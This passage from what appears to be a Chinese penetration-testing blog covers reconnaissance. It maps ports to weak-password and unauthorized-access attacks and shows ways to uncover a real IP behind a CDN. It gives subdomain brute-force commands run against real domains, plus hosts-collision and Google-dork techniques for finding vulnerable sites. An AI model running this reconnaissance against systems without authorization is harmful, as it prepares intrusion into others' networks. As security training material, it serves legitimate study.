class="hljs-number">873</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8000</span>-<span class="hljs-number">9090</span>,<span class="hljs-number">80</span>-<span class="hljs-number">89</span>,<span class="hljs-number">80</span>,<span class="hljs-number">10000</span>,<span class="hljs-number">8888</span>,<span class="hljs-number">8649</span>,<span class="hljs-number">8083</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8089</span>,<span class="hljs-number">9090</span>,<span class="hljs-number">7778</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">6082</span>,<span class="hljs-number">5984</span>,<span class="hljs-number">4440</span>,<span class="hljs-number">3312</span>,<span class="hljs-number">3311</span>,<span class="hljs-number">3128</span>,<span class="hljs-number">2601</span>,<span class="hljs-number">2604</span>,<span class="hljs-number">2222</span>,<span class="hljs-number">2082</span>,<span class="hljs-number">2083</span>,<span class="hljs-number">389</span>,<span class="hljs-number">88</span>,<span class="hljs-number">512</span>,<span class="hljs-number">513</span>,<span class="hljs-number">514</span>,<span class="hljs-number">1025</span>,<span class="hljs-number">111</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">445</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">53</span><br></code></pre></div></td></tr></table></figure><h2 id="渗透常见端口及对应服务"><a href="#渗透常见端口及对应服务" class="headerlink" title="渗透常见端口及对应服务"></a><strong>渗透常见端口及对应服务</strong></h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-number">1.</span><span class="hljs-string">web类(web漏洞/敏感目录)</span><br><br><span class="hljs-string">第三方通用组件漏洞struts</span> <span class="hljs-string">thinkphp</span> <span class="hljs-string">jboss</span> <span class="hljs-string">ganglia</span> <span class="hljs-string">zabbix</span><br><br><span class="hljs-number">80</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">80</span><span class="hljs-number">-89</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">8000</span><span class="hljs-number">-9090</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">2</span><span class="hljs-string">.数据库类(扫描弱口令)</span><br><br><span class="hljs-number">1433 </span><span class="hljs-string">MSSQL</span><br><br><span class="hljs-number">1521 </span><span class="hljs-string">Oracle</span><br><br><span class="hljs-number">3306 </span><span class="hljs-string">MySQL</span><br><br><span class="hljs-number">5432 </span><span class="hljs-string">PostgreSQL</span><br><br><span class="hljs-number">3</span><span class="hljs-string">.特殊服务类(未授权/命令执行类/漏洞)</span><br><br><span class="hljs-number">443</span> <span class="hljs-string">SSL心脏滴血</span><br><br><span class="hljs-number">873</span> <span class="hljs-string">Rsync未授权</span><br><br><span class="hljs-number">5984 </span><span class="hljs-string">CouchDB</span> <span class="hljs-string">http://xxx:5984/_utils/</span><br><br><span class="hljs-number">6379 </span><span class="hljs-string">redis未授权</span><br><br><span class="hljs-number">7001</span><span class="hljs-string">,7002</span> <span class="hljs-string">WebLogic默认弱口令，反序列</span><br><br><span class="hljs-number">9200</span><span class="hljs-string">,9300</span> <span class="hljs-string">elasticsearch</span> <span class="hljs-string">参考WooYun:</span> <span class="hljs-string">多玩某服务器ElasticSearch命令执行漏洞</span><br><br><span class="hljs-number">11211</span> <span class="hljs-string">memcache未授权访问</span><br><br><span class="hljs-number">27017</span><span class="hljs-string">,27018</span> <span class="hljs-string">Mongodb未授权访问</span><br><br><span class="hljs-number">50000</span> <span class="hljs-string">SAP命令执行</span><br><br><span class="hljs-number">50070</span><span class="hljs-string">,50030</span> <span class="hljs-string">hadoop默认端口未授权访问</span><br><br><span class="hljs-number">4</span><span class="hljs-string">.常用端口类(扫描弱口令/端口爆破)</span><br><br><span class="hljs-number">21</span> <span class="hljs-string">ftp</span><br><br><span class="hljs-number">22</span> <span class="hljs-string">SSH</span><br><br><span class="hljs-number">23</span> <span class="hljs-string">Telnet</span><br><br><span class="hljs-number">2601</span><span class="hljs-string">,2604</span> <span class="hljs-string">zebra路由，默认密码zebra</span><br><br><span class="hljs-number">3389</span> <span class="hljs-string">远程桌面</span><br><br><span class="hljs-number">5</span><span class="hljs-string">.端口合计详情</span><br><br><span class="hljs-number">21</span> <span class="hljs-string">ftp</span><br><br><span class="hljs-number">22</span> <span class="hljs-string">SSH</span><br><br><span class="hljs-number">23</span> <span class="hljs-string">Telnet</span><br><br><span class="hljs-number">80</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">80</span><span class="hljs-number">-89</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">161</span> <span class="hljs-string">SNMP</span><br><br><span class="hljs-number">389</span> <span class="hljs-string">LDAP</span><br><br><span class="hljs-number">443</span> <span class="hljs-string">SSL心脏滴血以及一些web漏洞测试</span><br><br><span class="hljs-number">445</span> <span class="hljs-string">SMB</span><br><br><span class="hljs-number">512</span><span class="hljs-string">,513,514</span> <span class="hljs-string">Rexec</span><br><br><span class="hljs-number">873</span> <span class="hljs-string">Rsync未授权</span><br><br><span class="hljs-number">1025</span><span class="hljs-string">,111</span> <span class="hljs-string">NFS</span><br><br><span class="hljs-number">1433 </span><span class="hljs-string">MSSQL</span><br><br><span class="hljs-number">1521 </span><span class="hljs-string">Oracle:(iSqlPlus</span> <span class="hljs-string">Port:5560,7778)</span><br><br><span class="hljs-number">2082</span><span class="hljs-string">/2083</span> <span class="hljs-string">cpanel主机管理系统登陆</span> <span class="hljs-string">（国外用较多）</span><br><br><span class="hljs-number">2222 </span><span class="hljs-string">DA虚拟主机管理系统登陆</span> <span class="hljs-string">（国外用较多）</span><br><br><span class="hljs-number">2601</span><span class="hljs-string">,2604</span> <span class="hljs-string">zebra路由，默认密码zebra</span><br><br><span class="hljs-number">3128 </span><span class="hljs-string">squid代理默认端口，如果没设置口令很可能就直接漫游内网了</span><br><br><span class="hljs-number">3306 </span><span class="hljs-string">MySQL</span><br><br><span class="hljs-number">3312</span><span class="hljs-string">/3311</span> <span class="hljs-string">kangle主机管理系统登陆</span><br><br><span class="hljs-number">3389</span> <span class="hljs-string">远程桌面</span><br><br><span class="hljs-number">4440 </span><span class="hljs-string">rundeck</span> <span class="hljs-string">参考WooYun:</span> <span class="hljs-string">借用新浪某服务成功漫游新浪内网</span><br><br><span class="hljs-number">5432 </span><span class="hljs-string">PostgreSQL</span><br><br><span class="hljs-number">5900 </span><span class="hljs-string">vnc</span><br><br><span class="hljs-number">5984 </span><span class="hljs-string">CouchDB</span> <span class="hljs-string">http://xxx:5984/_utils/</span><br><br><span class="hljs-number">6082 </span><span class="hljs-string">varnish</span> <span class="hljs-string">参考WooYun:</span> <span class="hljs-string">Varnish</span> <span class="hljs-string">HTTP</span> <span class="hljs-string">accelerator</span> <span class="hljs-string">CLI</span> <span class="hljs-string">未授权访问易导致网站被直接篡改或者作为代理进入内网</span><br><br><span class="hljs-number">6379 </span><span class="hljs-string">redis未授权</span><br><br><span class="hljs-number">7001</span><span class="hljs-string">,7002</span> <span class="hljs-string">WebLogic默认弱口令，反序列</span><br><br><span class="hljs-number">7778 </span><span class="hljs-string">Kloxo主机控制面板登录</span><br><br><span class="hljs-number">8000</span><span class="hljs-number">-9090</span> <span class="hljs-string">都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上</span><br><br><span class="hljs-number">8080 </span><span class="hljs-string">tomcat/WDCP主机管理系统，默认弱口令</span><br><br><span class="hljs-number">8080</span><span class="hljs-string">,8089,9090</span> <span class="hljs-string">JBOSS</span><br><br><span class="hljs-number">8083 </span><span class="hljs-string">Vestacp主机管理系统</span> <span class="hljs-string">（国外用较多）</span><br><br><span class="hljs-number">8649 </span><span class="hljs-string">ganglia</span><br><br><span class="hljs-number">8888 </span><span class="hljs-string">amh/LuManager</span> <span class="hljs-string">主机管理系统默认端口</span><br><br><span class="hljs-number">9200</span><span class="hljs-string">,9300</span> <span class="hljs-string">elasticsearch</span> <span class="hljs-string">参考WooYun:</span> <span class="hljs-string">多玩某服务器ElasticSearch命令执行漏洞</span><br><br><span class="hljs-number">10000</span> <span class="hljs-string">Virtualmin/Webmin</span> <span class="hljs-string">服务器虚拟主机管理系统</span><br><br><span class="hljs-number">11211</span> <span class="hljs-string">memcache未授权访问</span><br><br><span class="hljs-number">27017</span><span class="hljs-string">,27018</span> <span class="hljs-string">Mongodb未授权访问</span><br><br><span class="hljs-number">28017</span> <span class="hljs-string">mongodb统计页面</span><br><br><span class="hljs-number">50000</span> <span class="hljs-string">SAP命令执行</span><br><br><span class="hljs-number">50070</span><span class="hljs-string">,50030</span> <span class="hljs-string">hadoop默认端口未授权访问</span><br></code></pre></div></td></tr></table></figure><h2 id="常见的端口和攻击方法"><a href="#常见的端口和攻击方法" class="headerlink" title="常见的端口和攻击方法"></a><strong>常见的端口和攻击方法</strong></h2><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617233531687.png" alt="image-20240617233531687"></p><hr><h4 id="查找真实ip-1"><a href="#查找真实ip-1" class="headerlink" title="查找真实ip"></a>查找真实ip</h4><p>如果目标网站使用了CDN，使用了cdn真实的ip会被隐藏，如果要查找真实的服务器就必须获取真实的ip，根据这个ip继续查询旁站。</p><p>注意：很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实ip也是一种途径。</p><p><strong>多地ping确认是否使用CDN</strong></p><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><p><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240618103735588.png" alt="image-20240618103735588"></p><p>** 查询历史DNS解析记录**<br>在查询到的历史解析记录中，最早的历史解析ip很有可能记录的就是真实ip，快速查找真实IP推荐此方法，但并不是所有网站都能查到。</p><p><strong>DNSDB</strong><br><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><strong>微步在线</strong><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><strong>Ipip.net</strong><br><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><p><strong>viewdns</strong><br><a href="https://viewdns.info/">https://viewdns.info</a></p><p><strong>phpinfo</strong><br>如果目标网站存在phpinfo泄露等，可以在phpinfo中的SERVER_ADDR或_SERVER[“SERVER_ADDR”]找到真实ip</p><p><strong>绕过CDN</strong><br>绕过CDN的多种方法具体可以参考 <a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p><hr>]]></content>
    
    
    <categories>
      
      <category>渗透基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透之信息收集（一）</title>
    <link href="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h1><p>渗透的本质是信息收集，在一个渗透项目当中，信息搜集是一个非常重要的环节，搜集足够多的信息，测试足够多的信息，才有足够多的可能。</p><p><strong>搜集信息主要包括但不限于域名信息，子域名信息，网站信息，网站根目录敏感文件，网站真实ip，ip暴露端口，中间件信息等等….</strong></p><hr><h1 id="Web信息搜集"><a href="#Web信息搜集" class="headerlink" title="Web信息搜集"></a>Web信息搜集</h1><h2 id="前期探测"><a href="#前期探测" class="headerlink" title="前期探测"></a>前期探测</h2><p><strong>1、域名信息</strong><br><strong>2、对应ip收集</strong><br>相关域名对应ip，相关工具：</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">nslookup</span><br><br>ip138……<br></code></pre></div></td></tr></table></figure><p>查找目标域名信息的方法</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">fofa title=“公司名称”<br><br>百度搜索 <span class="hljs-built_in">int</span>itle=公司名称<br><br>Google搜索 <span class="hljs-built_in">int</span>itle=公司名称<br><br>站长之家直接搜索名称或者网站域名即可查看相关信息：http:<span class="hljs-comment">//tool.chinaz.com</span><br><br>钟馗之眼 site=域名即可 https:<span class="hljs-comment">//www.zoomeye.org/</span><br></code></pre></div></td></tr></table></figure><p><strong>3、子域名收集</strong></p><p>收集的子域名可以扩大测试的范围，统一域名下的二级域名都属于目标范围</p><p><strong>子域名在线查询</strong><br><a href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a>**</p><p><strong>工具：layer、subDomainsBrute</strong></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233109222.png" alt="image-20240617233109222"></p><p><strong>子域名在线查询1</strong><br><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233022961.png" alt="image-20240617233022961"></p><p><strong>dns侦测</strong><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233040795.png" alt="image-20240617233040795"></p><p><strong>IP138查询子域名</strong><br><a href="https://site.ip138.com/baidu.com/domain.htm">https://site.ip138.com/baidu.com/domain.htm</a></p><p><strong>FOFA搜索子域名</strong><br><a href="https://fofa.so/">https://fofa.so/</a></p><p>语法：domain&#x3D;“baidu.com”</p><p><strong>Hackertarget查询子域名</strong><br><a href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a></p><p>注意：通过该方法查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。</p><p><strong>360测绘空间</strong><br><a href="https://quake.360.cn/">https://quake.360.cn/</a></p><p>domain:”*.freebuf.com”</p><p><strong>SubDomainBrute</strong><br>pip install aiodns</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233140676.png" alt="image-20240617233140676"></p><p>运行命令subDomainsBrute.py freebuf.com</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">subDomainsBrute<span class="hljs-selector-class">.py</span> freebuf<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--full</span> -o freebuf2.txt<br></code></pre></div></td></tr></table></figure><p><strong>Sublist3r</strong><br><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p><p>pip install -r requirements.txt</p><p>提示：以上方法为爆破子域名，由于字典比较强大，所以效率较高。</p><p>帮助文档</p><figure class="highlight diff"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs diff"><span class="hljs-deletion">-h ：帮助</span><br><br><span class="hljs-deletion">-d ：指定主域名枚举子域名</span><br><br><span class="hljs-deletion">-b ：调用subbrute暴力枚举子域名</span><br><br><span class="hljs-deletion">-p ：指定tpc端口扫描子域名</span><br><br><span class="hljs-deletion">-v ：显示实时详细信息结果</span><br><br><span class="hljs-deletion">-t ：指定线程</span><br><br><span class="hljs-deletion">-e ：指定搜索引擎</span><br><br><span class="hljs-deletion">-o ：将结果保存到文本</span><br><br><span class="hljs-deletion">-n ：输出不带颜色</span><br><br>默认参数扫描子域名<br><br>python sublist3r.py -d baidu.com<br><br>使用暴力枚举子域名<br><br>python sublist3r -b -d baidu.com<br></code></pre></div></td></tr></table></figure><p><strong>OneForALL</strong><br>pip3 install –user -r requirements.txt -i <a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p><p>python3 oneforall.py –target baidu.com run &#x2F;<em>收集</em>&#x2F;</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233234071.png" alt="image-20240617233234071"></p><p><strong>爆破子域名</strong></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> domain<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--word</span> True run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--targets</span> ./domains<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--word</span> True run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> domain<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--word</span> True <span class="hljs-attr">--concurrent</span> <span class="hljs-number">2000</span> run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> domain<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--word</span> True <span class="hljs-attr">--wordlist</span> subnames<span class="hljs-selector-class">.txt</span> run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> domain<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--word</span> True <span class="hljs-attr">--recursive</span> True <span class="hljs-attr">--depth</span> <span class="hljs-number">2</span> run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> d<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--fuzz</span> True <span class="hljs-attr">--place</span> m.*<span class="hljs-selector-class">.d</span><span class="hljs-selector-class">.com</span> <span class="hljs-attr">--rule</span> <span class="hljs-string">&#x27;[a-z]&#x27;</span> run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> d<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--fuzz</span> True <span class="hljs-attr">--place</span> m.*<span class="hljs-selector-class">.d</span><span class="hljs-selector-class">.com</span> <span class="hljs-attr">--fuzzlist</span> subnames<span class="hljs-selector-class">.txt</span> run<br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233250532.png" alt="image-20240617233250532"></p><p><strong>隐藏域名hosts碰撞</strong><br>隐藏资产探测-hosts碰撞</p><p><a href="https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q">https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q</a></p><p>很多时候访问目标资产IP响应多为：401、403、404、500，但是用域名请求却能返回正常的业务系统（禁止IP直接访问），因为这大多数都是需要绑定host才能正常请求访问的 （目前互联网公司基本的做法）（域名删除了A记录，但是反代的配置未更新），那么我们就可以通过收集到的目标的 域名 和 目标资产 的IP段组合起来，以 IP段+域名 的形式进行捆绑碰撞，就能发现很多有意思的东西。</p><p>在发送http请求的时候，对域名和IP列表进行配对，然后遍历发送请求 （就相当于修改了本地的hosts文件一样），并把相应的title和响应包大小拿回 来做对比，即可快速发现一些隐蔽的资产。</p><p>进行hosts碰撞需要目标的域名和目标的相关IP作为字典</p><p>域名就不说了</p><p>相关IP来源有：</p><p>目标域名历史解析IP</p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p><a href="https://ipchaxun.com/">https://ipchaxun.com/</a></p><p>ip正则</p><p><a href="https://www.aicesu.cn/reg/">https://www.aicesu.cn/reg/</a></p><p><strong>4、Whois信息查询</strong><br>根据已知域名反查，分析出此域名的注册人、邮箱、电话等</p><p>工具：爱站网、站长工具、微步在线（<a href="https://x.threatbook.cn）、site.ip138.com、searchdns.netcraft.com、国外whois信息查询网址：https://who.is旁站c段">https://x.threatbook.cn）、site.ip138.com、searchdns.netcraft.com、国外whois信息查询网址：https://who.is旁站c段</a><br><strong>5、旁站</strong><br>一个服务器上有多个网站 通过ip查询服务器上的网站</p><p>C段<br>查找同一个ip段服务器上的网站，可以找到同样同站的类型和服务器，也可以获取同段服务器进行下一步渗透</p><p>收集方向<br>域名、端口、目录</p><p><strong>常用工具</strong></p><p>Webè<a href="http://www.5kik.com/c/%E3%80%81%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">http://www.5kik.com/c/、目录扫描工具</a></p><hr><h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>通过扫描目录和文件，大致了解同站的的结构，获取突破点，比如后台，文件备份，上传点<br><strong>收集方向</strong><br>Robots.txt、后台目录、安装包、上传目录、mysql管理接口、安装页面、phpinfo、编辑器、iis短文件、分析网站cms</p><p><strong>常用工具</strong><br>字典爆破：御剑、dirbuster、wwwscan、iis_shortname_scanner等</p><p>菜刀、webrobot、burp等</p><hr><h4 id="端口分析"><a href="#端口分析" class="headerlink" title="端口分析"></a>端口分析</h4><p>服务器需要开放服务，就必须开启端口，常见的端口是tcp和udp两种类型范围0-65535通过扫描得到的端口访问服务，规划下一步渗透</p><hr><h2 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h2><h3 id="1、服务器类型"><a href="#1、服务器类型" class="headerlink" title="1、服务器类型"></a><strong>1、服务器类型</strong></h3><p>服务器平台、版本等</p><h3 id="2、网站容器"><a href="#2、网站容器" class="headerlink" title="2、网站容器"></a><strong>2、网站容器</strong></h3><p>搭建网站等服务组件，例如：iis、apache、nginx、tomact等</p><h3 id="3、脚本类型"><a href="#3、脚本类型" class="headerlink" title="3、脚本类型"></a><strong>3、脚本类型</strong></h3><p>Asp、php、jsp、aspx等</p><h3 id="4、数据库类型"><a href="#4、数据库类型" class="headerlink" title="4、数据库类型"></a><strong>4、数据库类型</strong></h3><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada"><span class="hljs-keyword">Access</span>、sqlserver、mysql、oracle、postgresql等<br><br>Asp+<span class="hljs-keyword">access</span>/sqlserver<br><br>Aspx+sqlserver/<span class="hljs-keyword">access</span><br><br>Php+mysql<br><br>Php+postgresql<br><br>Php+oracle<br><br>Jsp+sqlserver/mysql/oracle<br><br>Linux jsp+mysql<br><br>Windows jsp+sqlserver<br></code></pre></div></td></tr></table></figure><h3 id="4、CMS类型"><a href="#4、CMS类型" class="headerlink" title="4、CMS类型"></a><strong>4、CMS类型</strong></h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Robots文件<br><br><span class="hljs-regexp">/plugs/</span> 之梦<br><br>登陆后台泄露cms类型<br><br>网站页脚泄露的cms<br><br>工具自动化识别cms类型<br><br>对应的cms漏洞直接利用<br><br>下载对应的cms分析目录<br><br>审计该cms源码漏洞<br><br>WAF<br></code></pre></div></td></tr></table></figure><h3 id="谷歌hacker"><a href="#谷歌hacker" class="headerlink" title="谷歌hacker"></a>谷歌hacker</h3><p><strong>Intext：</strong><br>查找网页中含有xx关键字的网站 例：intext：管理员登陆</p><p><strong>Intitle：</strong><br>查找某个标题 例：intitle：后台登陆</p><p><strong>Filetype：</strong><br>查找某个文件类型的文件 例：数据挖掘filetype：doc</p><p><strong>Inurl：</strong><br>查找url中带有某字段的网站 例：inurl：php？id&#x3D;</p><p><strong>Site：</strong><br>中某域名中查找信息</p><p>….</p><hr><h3 id="url采集"><a href="#url采集" class="headerlink" title="url采集"></a>url采集</h3><p><strong>采集相关url的同类网站</strong><br>例如:<br>Php？id&#x3D;<br><strong>漏洞网站</strong><br>相同某种指纹网站<br><strong>常用工具</strong><br>谷歌hacker<br>url采集器</p><h3 id="信息分析"><a href="#信息分析" class="headerlink" 